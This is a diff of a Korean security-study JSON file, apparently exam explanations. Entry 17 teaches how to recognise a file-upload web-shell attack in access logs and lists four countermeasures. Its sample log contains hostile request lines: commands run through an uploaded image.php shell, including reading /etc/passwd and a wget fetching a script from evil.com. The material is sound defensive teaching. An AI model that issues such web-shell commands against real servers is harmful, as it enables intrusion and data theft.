@@ -69,7 +69,7 @@
     "17": {
       "domain": "애플리케이션보안",
       "explanation": "액세스 로그에서 `.php`, `.jsp` 등 스크립트 파일 업로드 요청과 그 파일에 대한 직접 GET 요청(200)이 이어지면 **파일 업로드 → 웹셸** 공격. 대응 4종: ①확장자 화이트리스트(+MIME/시그니처 검증) ②업로드 디렉토리 스크립트 실행 권한 제거(핸들러 매핑 해제) ③웹 루트 밖에 저장 후 다운로드는 별도 로직 ④파일명 난수화·실행 속성 제거.",
-      "supplement": "분석 대상 웹 서버 Access 로그 (재구성 예시):\n\n```\n203.0.113.50 - - [12/Jul/2026:14:22:07 +0900] \"POST /board/upload.php HTTP/1.1\" 200 512 \"http://site.com/board/write\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:22:41 +0900] \"GET /data/upload/image.php?cmd=id HTTP/1.1\" 200 46 \"-\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:23:10 +0900] \"GET /data/upload/image.php?cmd=cat+/etc/passwd HTTP/1.1\" 200 1287 \"-\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:24:55 +0900] \"GET /data/upload/image.php?cmd=wget+http://evil.com/bd.sh HTTP/1.1\" 200 12 \"-\" \"curl/7.88\"\n```\n\n- 게시판에 `.php` 파일 업로드(POST) 성공(200) 직후\n- 업로드된 파일에 `?cmd=` 파라미터로 시스템 명령을 실행하는 요청이 이어짐 → **웹셸(Web Shell)**"
+      "supplement": "```\n203.0.113.50 - - [12/Jul/2026:14:22:07 +0900] \"POST /board/upload.php HTTP/1.1\" 200 512 \"http://site.com/board/write\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:22:41 +0900] \"GET /data/upload/image.php?cmd=id HTTP/1.1\" 200 46 \"-\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:23:10 +0900] \"GET /data/upload/image.php?cmd=cat+/etc/passwd HTTP/1.1\" 200 1287 \"-\" \"Mozilla/5.0\"\n203.0.113.50 - - [12/Jul/2026:14:24:55 +0900] \"GET /data/upload/image.php?cmd=wget+http://evil.com/bd.sh HTTP/1.1\" 200 12 \"-\" \"curl/7.88\"\n```\n\n- 게시판에 `.php` 파일 업로드(POST) 성공(200) 직후\n- 업로드된 파일에 `?cmd=` 파라미터로 시스템 명령을 실행하는 요청이 이어짐 → **웹셸(Web Shell)**"
     },
     "18": {
       "domain": "시스템보안",
